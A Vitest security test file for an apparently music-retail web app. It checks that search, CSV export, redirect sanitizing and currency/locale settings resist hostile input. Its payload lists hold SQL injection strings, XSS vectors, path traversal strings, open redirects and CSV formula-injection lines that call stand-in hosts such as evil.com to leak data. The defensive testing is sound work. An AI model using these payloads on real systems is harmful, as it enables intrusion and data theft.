import { describe, it, expect, beforeEach } from "vitest";
import {
  matchesSearchQuery,
  scoreSearchMatch,
  findHighlightRange,
} from "@/lib/search/searchIntelligence";
import { escapeCsvCell, toCsv } from "@/lib/api/csv";
import {
  useCurrencyLocaleStore,
  ACTIVE_CURRENCIES,
  ACTIVE_LOCALES,
} from "@/components/layout/currencyLocaleStore";
import { sanitizeAuthRedirect } from "@/lib/auth/safeRedirect";

describe("Tier 5 Adversarial: Malicious Payload Injection & Sanitization Resilience", () => {
  beforeEach(() => {
    useCurrencyLocaleStore.getState().init();
  });

  describe("SQL Injection (SQLi) Payload Neutralization", () => {
    const sqliPayloads = [
      "' OR '1'='1",
      "' OR 1=1 --",
      "'; DROP TABLE orders; --",
      "1' UNION SELECT id, email, password FROM users --",
      "admin'--",
      "' OR ''='",
      "1; WAITFOR DELAY '0:0:5'--",
      "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)",
    ];

    it("safely evaluates SQLi payloads in product search without unhandled exceptions or regex explosions", () => {
      for (const payload of sqliPayloads) {
        expect(() => {
          const matched = matchesSearchQuery("Fender Stratocaster Electric Guitar", payload);
          expect(typeof matched).toBe("boolean");
        }).not.toThrow();

        expect(() => {
          const score = scoreSearchMatch("Gibson Les Paul Standard", payload);
          expect(typeof score).toBe("number");
          expect(Number.isFinite(score)).toBe(true);
        }).not.toThrow();
      }
    });

    it("safely extracts highlight ranges for SQLi search strings without regex ReDoS crashes", () => {
      for (const payload of sqliPayloads) {
        expect(() => {
          const range = findHighlightRange("Fender Player Stratocaster", payload);
          if (range !== null) {
            expect(range.start).toBeGreaterThanOrEqual(0);
            expect(range.end).toBeGreaterThanOrEqual(range.start);
          }
        }).not.toThrow();
      }
    });
  });

  describe("Cross-Site Scripting (XSS) & HTML Injection Neutralization", () => {
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      '<img src="x" onerror="alert(document.cookie)">',
      '"><script>alert(1)</script>',
      "javascript:alert('pwned')",
      "<svg/onload=alert`1`>",
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><svg onload=alert(1)>',
      "<body onload=alert('XSS')>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ];

    it("tokenizes and neutralizes HTML/XSS character sequences in search queries", () => {
      for (const payload of xssPayloads) {
        const result = matchesSearchQuery("Audio-Technica ATH-M50x Studio Headphones", payload);
        expect(typeof result).toBe("boolean");

        const score = scoreSearchMatch("Yamaha HS8 Studio Monitor", payload);
        expect(typeof score).toBe("number");
        expect(Number.isFinite(score)).toBe(true);
      }
    });

    it("rejects malicious javascript: and open redirect vectors via sanitizeAuthRedirect", () => {
      const maliciousRedirects = [
        "javascript:alert(document.cookie)",
        "javascript://vibemusic.in/%0Aalert(1)",
        "data:text/html,<script>alert(1)</script>",
        "https://evil-attacker.com/steal-session",
        "//evil-attacker.com/phishing",
        "\\\\evil-attacker.com\\share",
        "/\\evil.com",
        "https://vibemusic.in.evil.com/login",
      ];

      for (const redirect of maliciousRedirects) {
        const sanitized = sanitizeAuthRedirect(redirect);
        // Must fallback to safe default (either empty or safe relative path like '/')
        expect(sanitized.startsWith("javascript:")).toBe(false);
        expect(sanitized.startsWith("data:")).toBe(false);
        expect(sanitized.startsWith("https://evil-attacker.com")).toBe(false);
        expect(sanitized.startsWith("//evil-attacker.com")).toBe(false);
      }
    });
  });

  describe("CSV Formula Injection (DDE) Neutralization in Orders Export", () => {
    const formulaPayloads = [
      "=cmd|' /C calc'!A0",
      "=10+20",
      "+cmd|' /C calc'!A0",
      "-2+5*cmd|' /C calc'!A0",
      "@SUM(1+1)*cmd|' /C calc'!A0",
      "\t=1+1",
      "\r=1+1",
      "=IMPORTXML('http://evil.com/leak', '//')",
      "=HYPERLINK('http://evil.com/steal?data=' & A1, 'Click here')",
    ];

    it("quotes or neutralizes formula trigger prefixes (=, +, -, @, \\t, \\r) in CSV cells", () => {
      for (const payload of formulaPayloads) {
        const escaped = escapeCsvCell(payload);
        // Cell containing formula trigger must be wrapped in quotes
        expect(escaped.startsWith('"') && escaped.endsWith('"')).toBe(true);
      }
    });

    it("correctly escapes embedded double quotes and commas under RFC 4180 rules", () => {
      const complexAttack = '=HYPERLINK("http://attacker.com/malicious", "Click ""Free Guitar""!")';
      const escaped = escapeCsvCell(complexAttack);
      expect(escaped.startsWith('"')).toBe(true);
      expect(escaped.endsWith('"')).toBe(true);
      // Double quotes inside must be escaped as two double quotes
      expect(escaped).toContain('""http://attacker.com/malicious""');
    });

    it("generates well-formed CSV rows without line-break tampering or delimiter hijacking", () => {
      const headers = ["ID", "Customer", "Total"];
      const maliciousRows = [
        ["ORD-001", 'John "The Hacker"\nRole: Admin', 5000],
        ["ORD-002", "=2+5\r\nEVIL_ROW,Attacker,0", 12000],
        ["ORD-003", "Normal Customer", 3500],
      ];

      const csv = toCsv(headers, maliciousRows);
      expect(csv).toContain("ID,Customer,Total\n");
      // Header row must be intact
      const lines = csv.split("\n");
      expect(lines[0]).toBe("ID,Customer,Total");
      expect(csv.endsWith("\n")).toBe(true);
    });
  });

  describe("Storefront Currency & Locale Parameter Pollution & Path Traversal Defense", () => {
    it("strictly rejects directory traversal, SQLi, and non-whitelisted currency codes", () => {
      const adversarialCurrencies = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "INR; DROP TABLE currencies;",
        "<script>alert(1)</script>",
        "__proto__",
        "constructor",
        "USD' OR 1=1--",
        "BITCOIN",
        "XYZ",
        "",
        " ",
      ];

      for (const badCode of adversarialCurrencies) {
        useCurrencyLocaleStore.getState().setCurrency(badCode);
        const currentCurrency = useCurrencyLocaleStore.getState().currency;
        // Currency store must NOT adopt the invalid code; it must remain an active currency
        expect(ACTIVE_CURRENCIES.some((c) => c.code === currentCurrency)).toBe(true);
        expect(currentCurrency).not.toBe(badCode);
      }

      // Valid currency code works
      useCurrencyLocaleStore.getState().setCurrency("usd");
      expect(useCurrencyLocaleStore.getState().currency).toBe("USD");
      useCurrencyLocaleStore.getState().setCurrency("inr");
      expect(useCurrencyLocaleStore.getState().currency).toBe("INR");
    });

    it("strictly rejects non-whitelisted locale strings and prototype pollution", () => {
      const adversarialLocales = [
        "../../locales/secret",
        "en-US; DROP TABLE users;",
        "<script>alert(1)</script>",
        "__proto__",
        "prototype",
        "fr-FR",
        "ru-RU",
        "",
      ];

      for (const badLocale of adversarialLocales) {
        useCurrencyLocaleStore.getState().setLocale(badLocale);
        const currentLocale = useCurrencyLocaleStore.getState().locale;
        expect(ACTIVE_LOCALES.some((l) => l.code === currentLocale)).toBe(true);
        expect(currentLocale).not.toBe(badLocale);
      }

      // Valid locale switches accurately
      useCurrencyLocaleStore.getState().setLocale("hi-IN");
      expect(useCurrencyLocaleStore.getState().locale).toBe("hi-IN");
      useCurrencyLocaleStore.getState().setLocale("en-IN");
      expect(useCurrencyLocaleStore.getState().locale).toBe("en-IN");
    });
  });

  describe("Extreme Length & ReDoS Search Stress Payloads", () => {
    it("handles 10,000-character payload queries without stack overflow or ReDoS hang", () => {
      const longQuery = "a".repeat(10000);
      const start = performance.now();
      const result = matchesSearchQuery("Fender American Professional II Stratocaster", longQuery);
      const elapsed = performance.now() - start;

      expect(typeof result).toBe("boolean");
      // Must execute within 150ms even with 10k characters
      expect(elapsed).toBeLessThan(150);
    });

    it("handles null bytes, non-ASCII control characters, and RTL unicode overrides safely", () => {
      const weirdStrings = [
        "Fender\0Stratocaster",
        "\u0000\u0001\u0002\u0003\u0004",
        "\u202Ereversed_search_text\u202D", // BiDi override
        "🎸🎶🔊🎹⚡", // Pure emojis
        "‎‎‎‎‎‎‎‎‎", // Zero-width spaces
      ];

      for (const query of weirdStrings) {
        expect(() => {
          matchesSearchQuery("Fender Stratocaster", query);
          scoreSearchMatch("Fender Stratocaster", query);
          findHighlightRange("Fender Stratocaster", query);
        }).not.toThrow();
      }
    });
  });
});
